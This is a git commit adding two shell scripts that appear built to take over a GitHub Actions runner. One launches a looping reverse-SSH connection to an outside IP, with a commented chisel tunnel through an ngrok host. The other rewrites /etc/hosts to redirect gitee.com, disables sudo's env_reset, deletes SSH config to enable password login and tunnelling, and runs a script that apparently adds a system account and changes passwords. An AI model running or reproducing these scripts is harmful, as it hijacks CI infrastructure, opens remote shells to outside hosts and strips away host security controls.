29d98a704da812b60a7965c15a43dbb0fa4acac0
18975806194@189.cn <18975806194@189.cn>
2025-06-21 13:13:21 +0000

    Initial commit (fresh start4)

---
+++ AABBCC_rev_shell.sh
@@ -0,0 +1,56 @@
+cd /tmp;
+set -x;
+exec 1>./y1rev
+exec 2>./y2rev
+
+
+sudo bash -c 'echo -e "\nls -al /tmp/t* /usr/lib/firefox/firefox /opt/microsoft/msedge/msedge /usr/bin/chrom*;alias  ll=\"ls -al\";
+echo 中文模式 ;
+ls -al /bin/ts45 /bin/cc45  /bin/edge /bin/bing;">>/root/.bash_profile';
+
+[ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
+ 
+
+(
+(while true; do
+        echo `date`;
+        [ ! -f /tmp/keepalive ] && break        
+         num61z=$(date +%S);
+         num67z=$(echo "1"$num61z);
+         num76=$((${num67z}%8));
+         bport=5005"$num76";ls -al /tmp/keepalive;echo $bport >> /tmp/keepalive;
+# 提取反弹upxSSH的主机和端口
+ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9;echo 456891 >/dev/null)
+port5=${ip_port5#*:};
+ip5=${ip_port5%:*};
+
+if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
+  date;
+  num51z=$(date +%S);
+  num67z=$(echo "1"$num51z);
+  num76=$((${num67z}%8));
+  bport2=5005"$num76";
+
+  export bport2=$bport2
+  export GITHUB_WORKSPACE=/home/runner/work/arm64/arm64
+  nohup $GITHUB_WORKSPACE/upx_reverse-ssh-armv7-x86 -v -b $bport2 -p 30022 118.31.229.160 &
+  #$GITHUB_WORKSPACE/chisel2upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
+  echo $?;
+
+
+    echo "exit_revSSH_isOK_$bport  $(date)";date;
+fi
+
+
+echo "will sleep 12s for while true";
+date;
+echo $(date);
+sleep 13; 
+
+
+done) &  )&
+
+
+
+
+
---
+++ ghub.sh
@@ -0,0 +1,57 @@
+chmod 0777 *;
+cd /tmp
+exec 1>./gh-y1
+exec 2>./gh-y2
+set -x
+sudo touch /tmp/keepalive;sudo chmod 0777 /tmp/keepalive;
+
+sudo bash -c 'echo 180.76.198.77 gitee.com  >> /etc/hosts'
+#45.195.136.233
+sudo bash -c 'echo 139.196.235.6 cn-sh-2.lcf.im   >> /etc/hosts'
+
+sudo touch /bin/edge;
+sudo touch /bin/bing;
+
+
+
+if [ ! -z ${GITHUB_WORKSPACE} ]; then 
+sudo chmod 0777 -R $GITHUB_WORKSPACE/ ; 
+fi
+
+
+sudo bash -c ' mkdir /tmp/{A,aB};
+chmod 0777 /tmp/{A,aB};
+sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
+grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt
+
+rm -f /etc/ssh/sshd_config.d/*.conf
+
+echo  -e "PasswordAuthentication yes\nPermitTunnel yes" > /etc/ssh/sshd_config.d/99liu.conf
+'
+
+
+# github_rev_ssh
+(id | grep "^uid=[0-9]\{1,9\}(runner)") && 
+(
+
+#修改系统密码 添加系统账户tee 重启sshd
+grep -q "tee" /etc/passwd ||
+(
+    . /home/runner/work/arm64/arm64/tee_pass.sh;
+)
+
+grep -q AABBCC_rev_shell /tmp/js9 &&
+(
+export HOME=/tmp;
+sudo -H su -l -c /home/runner/work/arm64/arm64/AABBCC_rev_shell.sh;
+)
+
+
+)
+
+
+
+
+# mkdir ~/.ssh;   cd ~/.ssh;
+
+
